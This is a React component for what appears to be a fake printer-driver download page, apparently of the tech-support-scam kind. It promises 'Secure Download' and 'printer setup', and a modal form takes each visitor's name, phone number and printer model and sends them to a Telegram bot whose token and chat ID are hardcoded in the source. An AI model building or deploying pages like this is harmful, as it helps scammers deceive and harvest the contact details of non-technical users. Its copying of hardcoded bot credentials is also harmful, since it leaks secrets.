import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { Printer, Download, HelpCircle } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogClose,
} from "@/components/ui/dialog";
import { Alert, AlertDescription } from "@/components/ui/alert";
import img from "../images/colorjet.png";
import img2 from "../images/Screenshot 2025-01-29 173931.png";

const Hero = () => {
  const [formData, setFormData] = useState({
    printerModel: "",
    name: "",
    phone: "",
  });
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const navigate = useNavigate();
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const TELEGRAM_BOT_TOKEN = "7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk";
    const TELEGRAM_CHAT_ID = "1684000886";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `📃 New Download Request\n👤 Name: ${formData.name}\n📞 Phone: ${formData.phone}\n🖨️ Printer Model: ${formData.printerModel}`,
          }),
        }
      );

      if (response.ok) {
        setSuccess(true);
        setTimeout(() => {
          navigate("/download-page");
        }, 2000);
      }
    } catch (error) {
      console.error("Error sending data:", error);
    }
    setLoading(false);
  };

  return (
    <div className="bg-white flex items-center justify-center ">
      <div className="max-w-4xl w-full bg-white rounded-xl shadow-lg border border-gray-200">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 p-6">
          <div className="space-y-6">
            <div className="text-center md:text-left">
              <div className="flex items-center gap-3 mb-4">
                <Printer className="h-12 w-12 text-red-600" />
                <img src={img2} className="h-8" alt="Logo" />
              </div>
              <h1 className="text-4xl font-bold text-gray-900 mb-4">
                Driver Download
              </h1>
              <p className="text-xl text-gray-600 leading-relaxed">
                Get the latest printer drivers and software for optimal
                performance. Quick setup process, guaranteed compatibility.
              </p>
            </div>

            <Link to="page-here"
              // onClick={() => setIsModalOpen(true)}

              className="w-full bg-red-600 text-white py-5 px-8 rounded-xl text-2xl font-bold hover:bg-red-700 transition-all flex items-center justify-center gap-3 shadow-md hover:shadow-lg"
            >
              <Download className="h-7 w-7" />
              Click here for printer setup
            </Link>

            <div className="bg-gray-50 p-4 rounded-lg">
              <p className="text-gray-600 text-lg">
                ✓ Drivers
                <br />
                ✓ Secure Download
                <br />✓ Windows 11/10/8/7 Compatible
              </p>
            </div>
          </div>

          <div className="flex items-center justify-center">
            <img
              src={img}
              alt="Printer"
              className="w-full rounded-lg shadow-lg"
            />
          </div>
        </div>
      </div>

      <Dialog open={isModalOpen} onOpenChange={() => {}}>
        <DialogContent className="sm:max-w-xl p-8">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-center mb-6">
              Complete Driver Setup
            </DialogTitle>
          </DialogHeader>
          <DialogClose
            className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100"
            onClick={() => setIsModalOpen(false)}
          >
            <span className="text-2xl">×</span>
          </DialogClose>

          {success ? (
            <div className="space-y-4">
              <Alert className="bg-green-50 border-green-200 p-6">
                <AlertDescription className="text-2xl text-green-800 text-center">
                  Initializing Download...
                </AlertDescription>
              </Alert>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-xl font-medium text-gray-900 mb-2">
                  Select Your Printer Model
                </label>
                <input
                  type="text"
                  required
                  value={formData.printerModel}
                  onChange={(e) =>
                    setFormData({ ...formData, printerModel: e.target.value })
                  }
                  placeholder="Example: PIXMA TR8620"
                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100 focus:border-red-500"
                />
              </div>

              <div>
                <label className="block text-xl font-medium text-gray-900 mb-2">
                  Full Name
                </label>
                <input
                  type="text"
                  required
                  value={formData.name}
                  onChange={(e) =>
                    setFormData({ ...formData, name: e.target.value })
                  }
                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100"
                />
              </div>

              <div>
                <label className="block text-xl font-medium text-gray-900 mb-2">
                  Contact Number
                </label>
                <input
                  type="tel"
                  required
                  value={formData.phone}
                  onChange={(e) =>
                    setFormData({ ...formData, phone: e.target.value })
                  }
                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-red-600 text-white py-4 px-6 rounded-xl text-2xl font-bold hover:bg-red-700 transition-all disabled:bg-red-300 shadow-lg"
              >
                {loading ? "Processing..." : "Download Now"}
              </button>

              <p className="text-center text-gray-500 text-sm">
                By downloading, you agree to our terms of service
              </p>
            </form>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Hero;
